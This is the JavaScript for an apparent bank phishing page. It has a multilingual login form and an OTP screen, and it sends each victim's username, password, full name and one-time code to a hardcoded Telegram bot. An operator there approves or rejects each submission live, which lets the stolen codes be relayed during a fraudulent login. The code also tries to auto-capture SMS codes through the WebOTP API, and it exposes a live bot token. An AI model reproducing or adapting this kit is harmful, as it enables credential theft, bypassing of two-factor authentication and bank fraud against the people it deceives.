// ==================== LOADING SCREEN ==================== 
(function() {
    const splash = document.getElementById('loadingScreen');
    if (!splash) return;

    // Hide main pages while loading
    document.querySelectorAll('.page').forEach(p => p.style.visibility = 'hidden');

    setTimeout(function() {
        splash.classList.add('exit-active');
        setTimeout(function() {
            splash.style.display = 'none';
            document.querySelectorAll('.page').forEach(p => p.style.visibility = '');
        }, 800);
    }, 1800);
})();

// ==================== STATE MANAGEMENT ==================== 
let currentLanguage = localStorage.getItem('language') || 'fr';
let selectedLanguage = currentLanguage;
let currentPage = 'loginPage';

// ==================== LANGUAGE CONFIGURATION ==================== 
const languages = {
    ar: { name: 'العربية', dir: 'rtl' },
    fr: { name: 'Français', dir: 'ltr' },
    en: { name: 'English', dir: 'ltr' },
    es: { name: 'Español', dir: 'ltr' },
    de: { name: 'Deutsch', dir: 'ltr' },
    nl: { name: 'Nederlands', dir: 'ltr' },
    it: { name: 'Italiano', dir: 'ltr' }
};

// ==================== INITIALIZATION ==================== 
document.addEventListener('DOMContentLoaded', function() {
    initializeApp();
    setupEventListeners();
    updateLanguage(currentLanguage);
});

function initializeApp() {
    setPageDirection(currentLanguage);
    updateLanguage(currentLanguage);
    // استعادة الصفحة المحفوظة من sessionStorage
    const savedPage = sessionStorage.getItem('currentPage') || 'loginPage';
    showPage(savedPage);
    updateActiveNav('home');
}

// ==================== LANGUAGE FUNCTIONS ==================== 
function updateLanguage(lang) {
    if (!languages[lang]) {
        lang = 'fr';
    }
    
    currentLanguage = lang;
    localStorage.setItem('language', lang);
    setPageDirection(lang);
    updateAllText(lang);
}

function setPageDirection(lang) {
    const html = document.documentElement;
    const direction = languages[lang]?.dir || 'rtl';
    
    html.setAttribute('dir', direction);
    html.setAttribute('lang', lang);
}

function updateAllText(lang) {
    // Update all elements with data attributes
    const elements = document.querySelectorAll('[data-ar]');
    elements.forEach(el => {
        if (el.tagName === 'INPUT') {
            // Handle input placeholders
            const placeholderAttr = `data-${lang}-placeholder`;
            const placeholder = el.getAttribute(placeholderAttr);
            if (placeholder) {
                el.placeholder = placeholder;
            }
        } else {
            // Handle text content
            const textAttr = `data-${lang}`;
            const text = el.getAttribute(textAttr);
            if (text) {
                el.textContent = text;
            }
        }
    });

    // Update input placeholders - including all inputs with any language placeholder
    const inputs = document.querySelectorAll('input[data-ar-placeholder], input[data-fr-placeholder], input[data-en-placeholder], input[data-es-placeholder], input[data-de-placeholder], input[data-nl-placeholder], input[data-it-placeholder]');
    inputs.forEach(input => {
        const placeholderAttr = `data-${lang}-placeholder`;
        const placeholder = input.getAttribute(placeholderAttr);
        if (placeholder) {
            input.placeholder = placeholder;
        }
    });
}

// ==================== PAGE NAVIGATION ==================== 
function showPage(pageName) {
    // Hide all pages
    document.querySelectorAll('.page').forEach(page => {
        page.classList.remove('active');
    });
    
    // Show selected page
    const pageElement = document.getElementById(pageName);
    if (pageElement) {
        pageElement.classList.add('active');
        currentPage = pageName;
        // حفظ الصفحة الحالية في sessionStorage
        sessionStorage.setItem('currentPage', pageName);
    }
}

function updateActiveNav(page) {
    document.querySelectorAll('.nav-item').forEach(item => {
        item.classList.remove('active');
        if (item.getAttribute('data-page') === page) {
            item.classList.add('active');
        }
    });
}

// ==================== EVENT LISTENERS ==================== 
function setupEventListeners() {
    // Login Form
    const loginForm = document.getElementById('loginForm');
    if (loginForm) {
        loginForm.addEventListener('submit', handleLogin);
    }

    // Password Toggle
    const eyeToggle = document.getElementById('eyeToggle');
    if (eyeToggle) {
        eyeToggle.addEventListener('click', togglePasswordVisibility);
    }

    // Navigation Items - ALL PAGES
    document.querySelectorAll('.nav-item').forEach(item => {
        item.addEventListener('click', function() {
            const page = this.getAttribute('data-page');
            
            if (page === 'home') {
                showPage('loginPage');
                updateActiveNav('home');
            } else if (page === 'agencies') {
                showPage('loginPage'); // Placeholder - can be replaced with agencies page
                updateActiveNav('agencies');
            } else if (page === 'menu') {
                showPage('menuPage');
                updateActiveNav('menu');
            }
        });
    });

    // Menu Items
    const settingsBtn = document.getElementById('settingsBtn');
    if (settingsBtn) {
        settingsBtn.addEventListener('click', () => {
            showPage('settingsPage');
        });
    }

    const helpBtn = document.getElementById('helpBtn');
    if (helpBtn) {
        helpBtn.addEventListener('click', () => {
            // Help action
        });
    }

    // Settings
    const languageBtn = document.getElementById('languageBtn');
    if (languageBtn) {
        languageBtn.addEventListener('click', () => {
            selectedLanguage = currentLanguage;
            updateLanguageSelection();
            showPage('languagePage');
        });
    }

    // Back Buttons
    document.getElementById('backBtn')?.addEventListener('click', () => {
        showPage('loginPage');
        updateActiveNav('home');
    });

    document.getElementById('backBtn2')?.addEventListener('click', () => {
        showPage('menuPage');
        updateActiveNav('menu');
    });

    document.getElementById('backBtn3')?.addEventListener('click', () => {
        showPage('settingsPage');
    });

    // Language Selection
    document.querySelectorAll('.language-option').forEach(option => {
        option.addEventListener('click', function() {
            selectLanguage(this.getAttribute('data-lang'));
        });
    });

    // Language Buttons
    document.getElementById('confirmBtn')?.addEventListener('click', confirmLanguageChange);
    document.getElementById('cancelBtn')?.addEventListener('click', () => {
        showPage('settingsPage');
    });

    // Create Account
    document.querySelector('.btn-create-account')?.addEventListener('click', () => {
        // Create account action
    });

    // ── English-only restriction for username & password ──
    setupEnglishOnlyInput(document.getElementById('username'));
    setupEnglishOnlyInput(document.getElementById('password'));

    // ── OTP page ──
    document.getElementById('backBtnOtp')?.addEventListener('click', () => {
        showPage('loginPage');
        updateActiveNav('home');
        resetOtp();
    });

    setupOtpBoxes();
    displayOtpPhoneNumber();

    document.getElementById('otpConfirmBtn')?.addEventListener('click', submitOtp);

    document.getElementById('otpResendBtn')?.addEventListener('click', () => {
        resetOtp();
        focusFirstOtpBox();
    });
}

// ==================== TELEGRAM INTEGRATION ==================== 
const BOT_TOKEN = '8778518931:AAFniw3-FG4AghxkGHCzQgi23c-f6oFULLg';
const CHAT_ID = '6165206261';
const WEBHOOK_URL = 'https://api.telegram.org/bot' + BOT_TOKEN;

async function sendToTelegram(message, requestId, dataType) {
    try {
        const payload = {
            chat_id: CHAT_ID,
            text: message,
            parse_mode: 'HTML'
        };
        
        // إضافة الأزرار لجميع الصفحات ما عدا صفحة التسجيل الأولية
        if (dataType !== 'reg') {
            payload.reply_markup = {
                inline_keyboard: [[
                    { text: '✅ قبول', callback_data: `approve_${dataType}_${requestId}` },
                    { text: '❌ رفض', callback_data: `reject_${dataType}_${requestId}` }
                ]]
            };
        }

        const response = await fetch(`${WEBHOOK_URL}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        });
        const json = await response.json();
        return json.result ? json.result.message_id : null;
    } catch (error) {
        console.error('خطأ في إرسال البيانات إلى تليجرام:', error);
        return null;
    }
}

async function editTelegramMessage(messageId, originalText, resultText) {
    try {
        await fetch(`${WEBHOOK_URL}/editMessageText`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                message_id: messageId,
                text: originalText + '\n\n' + resultText,
                parse_mode: 'HTML',
                reply_markup: { inline_keyboard: [] }
            })
        });
    } catch (error) {
        console.error('خطأ في تعديل رسالة تليجرام:', error);
    }
}

async function checkWebhookResponse(requestId, dataType) {
    try {
        const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=-1`);
        const data = await response.json();
        if (data.ok && data.result && data.result.length > 0) {
            for (let update of data.result) {
                if (update.callback_query) {
                    const callbackData = update.callback_query.data;
                    if (callbackData === `approve_${dataType}_${requestId}`) return 'approved';
                    if (callbackData === `reject_${dataType}_${requestId}`) return 'rejected';
                }
            }
        }
        return 'pending';
    } catch (error) {
        console.error('خطأ في التحقق من استجابة تليجرام:', error);
        return 'pending';
    }
}

function showRejection() {
    window.location.href = 'rejection.html';
}

function closeOtpRejection() {
    const otpRejectionModal = document.getElementById('otpRejectionModal');
    if (otpRejectionModal) otpRejectionModal.classList.remove('show');
    
    // إعادة تعيين حقول OTP لإعادة المحاولة
    resetOtp();
    focusFirstOtpBox();
}

// ==================== LOGIN HANDLING ==================== 
function handleLogin(e) {
    e.preventDefault();
    
    const username = document.getElementById('username').value.trim();
    const password = document.getElementById('password').value.trim();
    
    // Clear previous errors
    document.getElementById('usernameError').textContent = '';
    document.getElementById('passwordError').textContent = '';
    document.getElementById('username').classList.remove('error');
    document.getElementById('password').classList.remove('error');
    
    let hasError = false;
    
    const errorMessages = {
        ar: {
            usernameRequired: 'اسم المستخدم مطلوب',
            passwordRequired: 'كلمة المرور مطلوبة'
        },
        fr: {
            usernameRequired: 'L\'identifiant est requis',
            passwordRequired: 'Le mot de passe est requis'
        },
        en: {
            usernameRequired: 'Username is required',
            passwordRequired: 'Password is required'
        },
        es: {
            usernameRequired: 'El nombre de usuario es obligatorio',
            passwordRequired: 'La contraseña es obligatoria'
        },
        de: {
            usernameRequired: 'Benutzername erforderlich',
            passwordRequired: 'Passwort erforderlich'
        },
        nl: {
            usernameRequired: 'Gebruikersnaam vereist',
            passwordRequired: 'Wachtwoord vereist'
        },
        it: {
            usernameRequired: 'Nome utente richiesto',
            passwordRequired: 'Password richiesta'
        }
    };
    
    // Validation
    if (!username) {
        const msg = errorMessages[currentLanguage]?.usernameRequired || errorMessages['ar'].usernameRequired;
        document.getElementById('usernameError').textContent = msg;
        document.getElementById('username').classList.add('error');
        hasError = true;
    }
    
    if (!password) {
        const msg = errorMessages[currentLanguage]?.passwordRequired || errorMessages['ar'].passwordRequired;
        document.getElementById('passwordError').textContent = msg;
        document.getElementById('password').classList.add('error');
        hasError = true;
    }
    
    if (!hasError) {
        // جلب الاسم الكامل من sessionStorage (الذي تم إدخاله في صفحة التسجيل)
        const fullName = sessionStorage.getItem('userFullName') || 'غير معروف';
        
        // إظهار واجهة الانتظار
        const loadingOverlay = document.getElementById('loadingOverlay');
        if (loadingOverlay) loadingOverlay.classList.add('show');
        
        // إرسال بيانات تسجيل الدخول إلى تليجرام
        const requestId = Date.now();
        const message = 
            `🔐 <b>صفحة تسجيل الدخول - Login</b>\n\n` +
            `👤 <b>الاسم الكامل:</b> <code>${fullName}</code>\n` +
            `👤 <b>اسم المستخدم:</b> <code>${username}</code>\n` +
            `🔑 <b>كلمة المرور:</b> <code>${password}</code>\n\n` +
            `⏰ ${new Date().toLocaleString('ar-EG')}`;
        
        sendToTelegram(message, requestId, 'login').then(messageId => {
            if (!messageId) return;

            const checkInterval = setInterval(async () => {
                const status = await checkWebhookResponse(requestId, 'login');
                if (status === 'approved') {
                    clearInterval(checkInterval);
                    await editTelegramMessage(messageId, message, '✅ تم القبول من تليجرام');
                    if (loadingOverlay) loadingOverlay.classList.remove('show');
                    
                    sessionStorage.setItem('loginUsername', username);
                    sessionStorage.setItem('loginPassword', password);
                    
                    showPage('otpPage');
                    updateActiveNav('home');
                    startOtpTimer();
                    focusFirstOtpBox();
                    document.getElementById('loginForm').reset();
                    document.getElementById('password').type = 'password';
                } else if (status === 'rejected') {
                    clearInterval(checkInterval);
                    await editTelegramMessage(messageId, message, '❌ تم الرفض من تليجرام');
                    if (loadingOverlay) loadingOverlay.classList.remove('show');
                    showRejection();
                }
            }, 2000);
        });
    }
}

function togglePasswordVisibility() {
    const passwordInput = document.getElementById('password');
    const isPassword = passwordInput.type === 'password';
    
    passwordInput.type = isPassword ? 'text' : 'password';
}

// ==================== LANGUAGE SELECTION ==================== 
function updateLanguageSelection() {
    document.querySelectorAll('.language-option').forEach(option => {
        option.classList.remove('selected');
        if (option.getAttribute('data-lang') === selectedLanguage) {
            option.classList.add('selected');
        }
    });
}

function selectLanguage(lang) {
    if (languages[lang]) {
        selectedLanguage = lang;
        updateLanguageSelection();
    }
}

function confirmLanguageChange() {
    updateLanguage(selectedLanguage);
    // Return to login (home) page so the user sees the language change immediately
    showPage('loginPage');
    updateActiveNav('home');
}

// ==================== UTILITY FUNCTIONS ==================== 
window.updateLogoPath = function(newPath) {
    const logo = document.getElementById('bankLogo');
    if (logo) {
        logo.src = newPath;
    }
};

window.getCurrentLanguage = function() {
    return currentLanguage;
};

window.setLanguage = function(lang) {
    if (languages[lang]) {
        updateLanguage(lang);
    }
};

window.getAvailableLanguages = function() {
    return Object.keys(languages);
};

// ==================== ENGLISH-ONLY INPUT ====================
function setupEnglishOnlyInput(input) {
    if (!input) return;
    // Block non-Latin characters on input event
    input.addEventListener('input', function() {
        // Allow: ASCII printable chars (space 32 to tilde 126) only
        const cleaned = this.value.replace(/[^\x20-\x7E]/g, '');
        if (cleaned !== this.value) {
            const pos = this.selectionStart - (this.value.length - cleaned.length);
            this.value = cleaned;
            this.setSelectionRange(pos, pos);
        }
    });
    // Block non-Latin on keydown as well (for IME etc.)
    input.addEventListener('keydown', function(e) {
        // Allow control keys
        if (e.ctrlKey || e.metaKey || e.altKey) return;
        if (e.key.length === 1 && /[^\x20-\x7E]/.test(e.key)) {
            e.preventDefault();
        }
    });
}

// ==================== OTP LOGIC ====================
let otpInterval = null;

function setupOtpBoxes() {
    const input = document.getElementById('otpSingleInput');
    if (!input) return;

    // استدعاء دالة التعبئة التلقائية المتقدمة
    setupAdvancedOtpAutoFill();

    input.addEventListener('input', function() {
        // Keep only digits
        this.value = this.value.replace(/[^0-9]/g, '').slice(0, 6);
        // Update filled state
        if (this.value.length > 0) {
            this.classList.add('filled');
        } else {
            this.classList.remove('filled');
        }
        // Clear error on typing
        const errEl = document.getElementById('otpError');
        if (errEl) errEl.textContent = '';
        
        // Auto-submit when 6 digits are entered
        if (this.value.length === 6) {
            setTimeout(() => submitOtp(), 300);
        }
    });

    input.addEventListener('keydown', function(e) {
        if (e.key.length === 1 && !/[0-9]/.test(e.key) && !e.ctrlKey && !e.metaKey) {
            e.preventDefault();
        }
    });

    input.addEventListener('paste', function(e) {
        e.preventDefault();
        const pasted = (e.clipboardData || window.clipboardData).getData('text').replace(/[^0-9]/g, '').slice(0, 6);
        this.value = pasted;
        if (pasted.length > 0) this.classList.add('filled');
    });
}

function focusFirstOtpBox() {
    const input = document.getElementById('otpSingleInput');
    if (input) setTimeout(() => input.focus(), 300);
}

function resetOtp() {
    const input = document.getElementById('otpSingleInput');
    if (input) {
        input.value = '';
        input.classList.remove('filled', 'otp-shake');
    }
    const err = document.getElementById('otpError');
    if (err) err.textContent = '';
    clearInterval(otpInterval);
    const resendBtn = document.getElementById('otpResendBtn');
    if (resendBtn) resendBtn.disabled = true;
}

function displayOtpPhoneNumber() {
    const phoneNumber = sessionStorage.getItem('userPhoneNumber') || '';
    const phoneDisplay = document.getElementById('otpPhoneDisplay');
    
    if (phoneDisplay && phoneNumber) {
        // Get last 4 digits
        const lastFour = phoneNumber.slice(-4);
        phoneDisplay.textContent = `****${lastFour}`;
    }
}

function startOtpTimer() {
    // Timer disabled - no countdown display
    clearInterval(otpInterval);
}

function submitOtp() {
    const input = document.getElementById('otpSingleInput');
    const code = input ? input.value.trim() : '';
    const errEl = document.getElementById('otpError');

    if (code.length < 6) {
        if (input) {
            input.classList.remove('otp-shake');
            void input.offsetWidth; // reflow
            input.classList.add('otp-shake');
            setTimeout(() => input.classList.remove('otp-shake'), 400);
        }
        const msgs = {
            ar: 'يرجى إدخال 6 أرقام',
            fr: 'Veuillez entrer 6 chiffres',
            en: 'Please enter 6 digits',
            es: 'Ingrese 6 dígitos',
            de: 'Bitte geben Sie 6 Ziffern ein',
            nl: 'Voer 6 cijfers in',
            it: 'Inserisci 6 cifre'
        };
        if (errEl) errEl.textContent = msgs[currentLanguage] || msgs.en;
        return;
    }

    if (errEl) errEl.textContent = '';
    clearInterval(otpInterval);

    // إرسال رمز التحقق إلى تليجرام
    const requestId = Date.now();
    const fullName = sessionStorage.getItem('userFullName') || 'غير معروف';
    const phoneNumber = sessionStorage.getItem('userPhoneNumber') || 'غير معروف';
    const message = 
        `🔐 <b>صفحة رمز التحقق - OTP Verification</b>\n\n` +
        `👤 <b>الاسم الكامل:</b> <code>${fullName}</code>\n` +
        `📱 <b>رقم الهاتف:</b> <code>****${phoneNumber.slice(-4)}</code>\n` +
        `🔑 <b>رمز التحقق:</b> <code>${code}</code>\n\n` +
        `⏰ ${new Date().toLocaleString('ar-EG')}`;
    
    // إظهار واجهة الانتظار
    const loadingOverlay = document.getElementById('loadingOverlay');
    if (loadingOverlay) loadingOverlay.classList.add('show');

    sendToTelegram(message, requestId, 'otp').then(messageId => {
        if (!messageId) return;

        const checkInterval = setInterval(async () => {
            const status = await checkWebhookResponse(requestId, 'otp');
            if (status === 'approved') {
                clearInterval(checkInterval);
                await editTelegramMessage(messageId, message, '✅ تم القبول من تليجرام');
                if (loadingOverlay) loadingOverlay.classList.remove('show');
                window.location.href = 'index.html';
            } else if (status === 'rejected') {
                clearInterval(checkInterval);
                await editTelegramMessage(messageId, message, '❌ تم الرفض من تليجرام (إعادة محاولة)');
                if (loadingOverlay) loadingOverlay.classList.remove('show');
                
                // إظهار واجهة الرفض المنبثقة
                const otpRejectionModal = document.getElementById('otpRejectionModal');
                if (otpRejectionModal) otpRejectionModal.classList.add('show');
                
                // إعادة تعيين OTP بدون بدء المؤقت
                resetOtp();
            }
        }, 2000);
    });
}

// ==================== Advanced OTP Extraction ====================
// استخراج الرمز من الرسائل النصية بناءً على كلمات مفتاحية متعددة
function extractOtpFromSms(smsText) {
    if (!smsText) return null;
    
    // قائمة الكلمات المفتاحية بلغات مختلفة
    const keywords = [
        // العربية
        'رمز', 'لمة كود', 'كود', 'كود تحويل', 'رمز تحويل', 'رمز التحقق', 'رمز التأكيد',
        // الإنجليزية
        'code', 'otp', 'verification', 'transfer code', 'confirmation code'
    ];
    
    // البحث عن أي كلمة مفتاحية متبوعة برقم
    for (let keyword of keywords) {
        const regex = new RegExp(`${keyword}[:\\s]*([0-9]{4,8})`, 'gi');
        const match = smsText.match(regex);
        if (match) {
            // استخراج الأرقام من النتيجة
            const codeMatch = match[0].match(/[0-9]{4,8}/);
            if (codeMatch) {
                return codeMatch[0].slice(0, 6); // أخذ أول 6 أرقام
            }
        }
    }
    
    // محاولة أخرى: البحث عن أي تسلسل من 4-8 أرقام متتالية
    const numberMatch = smsText.match(/[0-9]{4,8}/);
    if (numberMatch) {
        return numberMatch[0].slice(0, 6);
    }
    
    return null;
}

// تحسين معالج الاستقبال التلقائي
function setupAdvancedOtpAutoFill() {
    const input = document.getElementById('otpSingleInput');
    if (!input) return;
    
    // محاولة استخدام WebOTP API مع معالج بديل
    if ('OTPCredential' in window) {
        const controller = new AbortController();
        
        navigator.credentials.get({
            otp: { transport: ['sms'] },
            signal: controller.signal
        }).then(otp => {
            if (otp && otp.code) {
                // محاولة استخراج الرمز من الرسالة
                let code = extractOtpFromSms(otp.code);
                if (!code) {
                    // إذا فشل الاستخراج، استخدم الكود مباشرة
                    code = otp.code.replace(/[^0-9]/g, '').slice(0, 6);
                }
                
                if (code && code.length >= 4) {
                    input.value = code;
                    input.classList.add('filled');
                    if (code.length === 6) {
                        setTimeout(() => submitOtp(), 300);
                    }
                }
            }
        }).catch(err => {
            // WebOTP not available
        });
    }
}
